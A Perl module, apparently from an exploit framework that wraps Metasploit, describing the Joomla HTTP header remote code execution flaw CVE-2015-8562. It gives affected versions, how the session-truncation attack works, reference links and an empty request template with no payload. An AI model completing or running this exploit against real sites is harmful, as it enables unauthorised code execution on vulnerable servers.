package JOOMLA::MSF::JoomlaHttpHeaderRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "JoomlaHttpHeaderRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-8562",
  DESCRIPTION => "

          Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5.

          By storing user supplied headers in the databases session table it's possible to truncate the input

          by sending an UTF-8 character. The custom created payload is then executed once the session is read

          from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.

          In later versions the deserialisation of invalid session data stops on the first error and the

          exploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and

          5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1.

      ",
  HEADERS => " datastore[",
  METHOD => "GET",
  MSF_MODULE => "joomla_http_header_rce",
  REFERENCES => [
    "https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html",
    "https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html",
    "https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html",
    "https://blog.patrolserver.com/2015/12/17/in-depth-analyses-of-the-joomla-0-day-user-agent-exploit/",
    "https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F11330",
    "https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F89754.html",
    "https://bugs.php.net/bug.php?id=70219",
  ],
  TITLE => "Joomla HTTP Header Unauthenticated Remote Code Execution",
  VARIABLES => {
    'HEADER' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT3 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #3 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
